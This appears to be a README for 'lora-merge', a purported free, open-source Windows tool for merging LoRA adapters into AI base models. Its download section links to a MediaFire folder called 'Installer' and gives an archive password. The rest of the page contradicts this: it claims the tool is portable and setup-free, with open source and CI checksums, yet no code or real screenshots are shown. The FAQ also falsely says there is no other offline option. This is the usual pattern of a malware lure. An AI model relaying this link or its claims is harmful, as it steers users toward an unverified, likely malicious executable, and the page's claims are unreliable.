# lora-merge

🧬 Free, open-source LoRA merger for Windows — blend adapters into a base model at custom weights, export safetensors. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Weight sliders per adapter** — stack up to five LoRAs and set each blend ratio from zero to full
- ✅ **Base model safe mode** — merges onto a copy and verifies the output loads before you delete anything
- ✅ **Safetensors in, safetensors out** — keeps metadata and formatting, not a pickle-era mess
- ✅ **Preset library** — save favorite blends under names and rerun them after a base model update
- ✅ **Validation pass** — tensor count and shape check against the base before writing gigabytes
- ✅ **GPU or CPU merge** — uses VRAM when available and falls back to RAM on cards with no headroom
- ✅ **100 MB self-contained exe** — runtime and merge backend bundled, portable, offline, MIT

## Why lora-merge

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **lora-merge** | kohya sd-scripts | PEFT scripts | Web merge tools |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Free, OSS | Free accounts |
| Open source | **Yes** | Yes | Yes | No |
| GUI with per-adapter sliders | **Yes** | Complex config | No | Partial
| Five-adapter stacking | **Yes** | Scripted | Scripted | Rare
| Blend presets | **Yes** | No | No | No |
| Portable, no install | **Yes, 100 MB** | Python env | Python env | Upload required

## FAQ

**how to merge multiple LoRAs into one model offline?**

There is no way around doing it in Python or uploading multi-GB checkpoints to a website. lora-merge stacks up to five adapters with per-adapter weights, validates tensor shapes against the base and writes a clean safetensors file. It is a 100 MB portable exe, MIT, fully offline, and your models never leave the disk.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark mixer (#121418, purple #A78BFA): base model card top, five LoRA slots with weight sliders at 0.8, 0.5 and 0.3, output size estimate chip reading 6.2 GB.
2. Preset shelf: three saved blends with names and slider thumbnails, apply button, diff note reading base updated since last run with warning tint.
3. Validation and write: tensor check table showing matched counts, progress bar at 74 percent, remember-delete-source checkbox unchecked in red outline.

## Download

| Source | Link |
|---|---|
| 💾 **Installer lora-merge** | [Installer lora-merge](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).